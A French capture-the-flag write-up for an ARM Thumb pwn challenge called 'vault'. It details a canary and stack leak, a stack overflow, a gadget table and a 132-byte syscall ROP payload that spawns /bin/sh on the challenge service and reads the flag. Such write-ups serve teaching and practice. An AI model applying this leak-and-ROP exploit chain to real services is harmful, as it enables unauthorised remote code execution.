# PWN#Alpha — vault (ARM / Thumb / canary + syscall ROP)

## Statut

Résolu. Shell distant obtenu (`uid=65534(nobody)`), flag lu via `cat /flag/flag.txt` : `CTF{REDACTED}` (soumission laissée à l'utilisateur, jamais stockée dans le dépôt).

## Cible

- Binaire : `vault` — **ELF 32-bit LSB, ARM EABI5**, interpréteur `/lib/ld-linux-armhf.so.3`, **strippé**.
- sha256 : `ebada74666f8e1e91ee8994093fd65718ea464c418b5c78d22d00160c6cf09e7`.
- Protections : **Partial RELRO, Canary, NX, PIE**. Pas de leak libc direct.
- Service : `<HOST>:<PORT>`.
- Le binaire distribué est **corrompu volontairement** (stub d'entrée Thumb illisible, `main` absent du `_start`), mais l'exécution distante du binaire « officiel » fonctionne : on exploite directement le service.

## Indices

- `printf("[debug] build id: %p\n", ...)` → fuite d'un pointeur PIE constant (`0x40000945`, offset `0x945`).
- `printf("Hello, %s\n", buf)` **sans** terminaison NUL après `read(0, buf, 0x41)` → **fuite de pile** (canari + saved r7 + saved lr).
- `read(0, buf, 0x96)` (150 octets) dans un buffer de `0x40` → **débordement de pile**, même adresse que le `read` du nom.
- Le canari est vérifié via `eors r2, r3 ; beq` avant l'épilogue `adds r7,#0x48 ; mov sp,r7 ; pop {r7,pc}`.

## Reconnaissance

1. Désassemblage ARM/Thumb avec `radare2` (`-e anal.armthumb=true`), `llvm-objdump`, `ROPgadget --thumb`, faute de binutils ARM local.
2. `main` identifié (`fcn.0000089a`) et vérifié : leak `%p`, `read(0,buf,0x41)`, `printf("Hello, %s", buf)`, `read(0,buf,0x96)`, `puts("Message received.")`, canari, épilogue.
3. **ASLR désactivée en remote** : le saved r7 (adresse de pile) et la base PIE (`0x40000000`) sont **constants** entre connexions ; seul le canari est aléatoire (mais fuité).

### Fuite (nom = 64×`A` + `B`)

```
Hello, AAAA...B | canari[1:4] | saved r7 (4 o) | saved lr (tronqué)
```

- `canary = 0x00 || canari[1:4]`.
- `saved r7 = 0x3ffffbe0` → c'est à la fois le `sp` à l'entrée de `main` **et** la base de la chaîne ROP (`sp` après l'épilogue). Buffer = `saved r7 - 0x4c = 0x3ffffb94`.

## Gadgets (Thumb, `offset+1`)

| Gadget | Adresse | Effet |
|---|---|---|
| `pop {r3, pc}` | `0x676` | r3 |
| `mov r0,r3 ; adds r7,#0x10 ; mov sp,r7 ; pop {r7,pc}` | `0x75c` | r0 + pivot pile |
| `movs r1,r0 ; pop.w {sb,lr} ; pop {pc}` | `0x886` | r1 = r0 |
| `pop.w {r2,lr} ; pop {pc}` | `0x88e` | r2 |
| `svc #0 ; add.w r3,r3,#1 ; bx r3` | `0x9d8` | syscall + retour via r3 |

## Chaîne d'exploitation

Pas de `pop {r0}` : `r0` s'obtient uniquement via `mov r0,r3` (qui **pivote** `sp = r7+0x10`). On ne dépend donc d'aucune libc et on appelle directement `execve` par syscall.

Payload (132 octets, buffer `B = saved r7 - 0x4c`) :

```
[0..7]    "/bin/sh\0"
[8..11]   0x00000000            (argv = {NULL})
[64..67]  canari
[68..71]  saved r7 = Rb-8       (1er pivot -> sp = Rb+8)
[72..75]  POP_R3_PC             (1er pc)
[76..]    chaîne :
          r3=&NULL ; mov r0,r3 (pivot) ; movs r1,r0  -> r1=&NULL
          r3="/bin/sh" ; mov r0,r3 (pivot) ; r7=11
          r2=0 ; svc #0
```

Résultat : `execve("/bin/sh", {NULL}, NULL)` → shell `nobody`, puis :

```
$ cat /flag/flag.txt
CTF{REDACTED}
```

Validation : `id` → `uid=65534(nobody)` ; lecture du flag réussie. L'exploit est reproductible à chaque connexion (seul le canari est refuité). Voir `vault_exploit.py`.

## Pièges

- **`r7` est double-usage** : frame pointer de l'épilogue puis base de chaîne puis numéro de syscall. Les pivots successifs (`mov r0,r3`) imposent de recalculer `sp` et `r7` à chaque étape (mémoire de pile entièrement contrôlée car ASLR off).
- Le binaire local étant corrompu, l'émulation locale n'est pas un oracle fiable : valider en remote.
- `argv = NULL` accepté par le noyau ; sinon passer l'adresse d'un mot NULL (fait ici avec `argv = {NULL}`).
- La libc armhf distante est un build non public (les offsets relatifs dérivent de Debian 2.41) : préférer une chaîne **sans libc** (syscall) plutôt que ret2libc.
